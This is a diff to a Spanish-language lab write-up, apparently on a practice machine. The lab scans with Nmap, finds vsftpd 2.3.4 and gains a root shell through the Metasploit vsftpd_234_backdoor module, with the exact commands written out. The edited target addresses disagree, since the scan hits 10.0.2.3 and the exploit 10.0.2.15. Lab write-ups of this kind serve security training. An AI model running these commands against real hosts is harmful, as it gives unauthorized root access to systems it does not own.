@@ -7,7 +7,7 @@
 
 ## 2. Fase de Reconocimiento (Nmap)
 Ejecuté un escaneo agresivo para detectar versiones de servicios:
-`nmap -sV -O 192.168.1.X`
+`nmap -sV -p 21,22,80,445 10.0.2.3`
 
 **Resultados clave:**
 * Puerto 21 (FTP) abierto corriendo vsftpd 2.3.4.
@@ -16,8 +16,8 @@ Ejecuté un escaneo agresivo para detectar versiones de servicios:
 ## 3. Análisis y Explotación (Metasploit)
 Utilicé el framework Metasploit para verificar si la versión de vsftpd era vulnerable al backdoor conocido.
 * `use exploit/unix/ftp/vsftpd_234_backdoor`
-* `set RHOSTS 192.168.1.X`
-* `exploit`
+* `set RHOSTS 10.0.2.15`
+* `run`
 
 **Resultado:** Acceso exitoso a la terminal con privilegios de root.
 
